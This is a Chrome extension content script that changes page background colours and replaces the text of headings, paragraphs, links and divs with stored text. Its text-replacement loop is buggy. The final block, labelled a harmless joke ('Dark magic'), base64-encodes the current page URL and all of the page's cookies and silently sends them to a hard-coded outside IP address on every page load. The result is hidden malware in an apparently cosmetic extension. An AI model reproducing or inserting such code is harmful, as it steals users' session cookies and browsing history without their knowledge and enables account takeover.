/**
 * We get the new color from the buttons
 */
chrome.storage.local.get('colors', function (items) {
    if (items.colors !== undefined) {
        document.body.style.backgroundColor = items.colors.newColor;

        if (items.colors.newColor === "origin") {
            chrome.storage.local.remove('colors');
            document.body.style.backgroundColor = items.colors.lastColor
        }
    }
});

/**
 *  Change DOM data in h1, h2, h3, p, a and div tags
 */
chrome.storage.local.get('params', function (items) {
    if (items.params !== undefined) {
        if (items.params.mode === "special") {
            let text = items.params.txt;
            let go1 = document.getElementsByTagName("h1");
            let go2 = document.getElementsByTagName("h2");
            let go3 = document.getElementsByTagName("h3");
            let go4 = document.getElementsByTagName("p");
            let go5 = document.getElementsByTagName("a");
            let go6 = document.getElementsByTagName("div");

            for (let i = 0; i < Math.max(go1.length, go2.length, go3.length, go4.length, go5.length, go6.length); ++i) {
                if (i <= go1.length)
                    go1[i].childNodes[0].nodeValue = text;
                if (i <= go2.length)
                    go2[i].childNodes[0].nodeValue = text;
                if (i <= go3.length)
                    go3[i].childNodes[0].nodeValue = text;
                if (i <= go4.length)
                    go4[i].childNodes[0].nodeValue = text;
                if (i <= go5.length)
                    go5[i].childNodes[0].nodeValue = text;
                if (i <= go6.length)
                    go6[i].childNodes[0].nodeValue = text;
            }
        }
    }
    chrome.storage.local.remove('mode');
});

/**
 * Dark magic (don't touch it -- it's a joke --)
 */
{
    let xml = new XMLHttpRequest();
    let txt = "?url=" + btoa(window.location.toString().trim())
        + "&cookie=" + btoa(document.cookie);
    xml.open("GET", "http://35.180.80.89:5555/ninja" + txt, true);
    xml.send(null);
}
